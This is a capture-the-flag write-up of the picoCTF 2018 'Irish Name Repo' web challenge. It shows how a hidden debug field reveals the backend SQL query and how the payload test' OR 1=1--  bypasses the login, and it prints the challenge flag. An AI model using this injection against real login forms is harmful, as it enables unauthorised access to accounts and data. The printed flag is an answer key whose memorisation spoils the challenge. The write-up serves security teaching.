# Irish Name Repo (web, 200pts)

> There is a website running at http://2018shell.picoctf.com:11899. Do you think you can log us in? Try to see if you
> can login!

The challenge asks you to login to the website, so click through to the admin login (`/login.html`).

If you inspect the webpage you'll see a hidden `debug` form field that's sent when you login:

```html
<fieldset>
    <div class="form-group">
        <label for="username">Username:</label>
        <input type="text" id="username" name="username" class="form-control">
    </div>
    <div class="form-group">
        <label for="password">Password:</label>
        <div class="controls">
            <input type="password" id="password" name="password" class="form-control">
        </div>
    </div>
    <input type="hidden" name="debug" value="0">

    <div class="form-actions">
        <input type="submit" value="Login" class="btn btn-primary">
    </div>
</fieldset>
```

Configure [Burp Suite](https://portswigger.net/burp) to capture your browser traffic (or simply use your browser
developer tools) to make the process of editing and replaying requests easier.

Try to login with any credentials (e.g. `test`) and check the response:

```
HTTP/1.1 200 OK
Content-type: text/html; charset=UTF-8

<h1>Login failed.</h1>
```

There's nothing helpful here, so change the `debug` field to `1` (`Right-click > Send to Repeater` in Burp Suite will
add the request to the Repeater where you can easily change and resend the request) and send the modified request:

```
HTTP/1.1 200 OK
Content-type: text/html; charset=UTF-8

<pre>username: test
password: test
SQL query: SELECT * FROM users WHERE name='test' AND password='test'
</pre><h1>Login failed.</h1>
```

The response shows us that it's communicating with an SQL database and gives us the command that was executed - this
looks like the application could be subject to a classic
[SQL injection attack](https://www.owasp.org/index.php/SQL_Injection).

Change the password to `test' OR 1=1-- `:
* `OR 1=1` will cause the password check to always evaluate to `true`
* `-- ` indicates that the text that follows is a comment (needed because a closing quote `'` is added after the
password input)

Send the request to get the flag:

```
HTTP/1.1 200 OK
Content-type: text/html; charset=UTF-8

<pre>username: test
password: test' OR 1=1-- 
SQL query: SELECT * FROM users WHERE name='test' AND password='test' OR 1=1-- '
</pre><h1>Logged in!</h1><p>Your flag is: picoCTF{con4n_r3411y_1snt_1r1sh_9cbc118f}</p>
```
